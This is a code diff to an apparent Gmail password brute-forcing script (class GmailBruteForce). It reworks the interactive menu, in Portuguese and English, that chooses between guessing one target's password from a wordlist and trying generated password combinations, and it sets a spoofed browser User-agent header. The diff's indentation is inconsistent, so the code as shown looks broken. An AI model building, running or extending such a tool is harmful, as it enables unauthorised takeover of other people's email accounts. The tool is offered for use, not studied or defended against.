@@ -52,25 +52,17 @@ instance = GmailBruteForce()
 
 do = input('''
 		Choose any number ?
-		1 - Email file
-		2 - target email
-    3- combinação de senha
+		1 - Gmail ( Normal com wordlsit) 
+		2- Gmail já via combinação de senha
+                
 		
 		==> ''')
 
-if do == '1':
-    user = input("List Of Usernames => ")
-    passfile = input("List Of Passwords => ")
 
-    instance.get_acc_list(user)
-    instance.get_pass_list(passfile)
-    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-    instance.try_gmail()
    
-############
-if do == '2':
-    user = input("email : ")
+
+if do == '1':
+    user = input("gmail : ")
     senha = input("passlist : ")
     headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
@@ -82,7 +74,7 @@ if do == '2':
     
     ########################################
     
-    if do == '3':
+    if do == '2':
     user = input("email : ")
     senha = ''
     	for i in range(10):
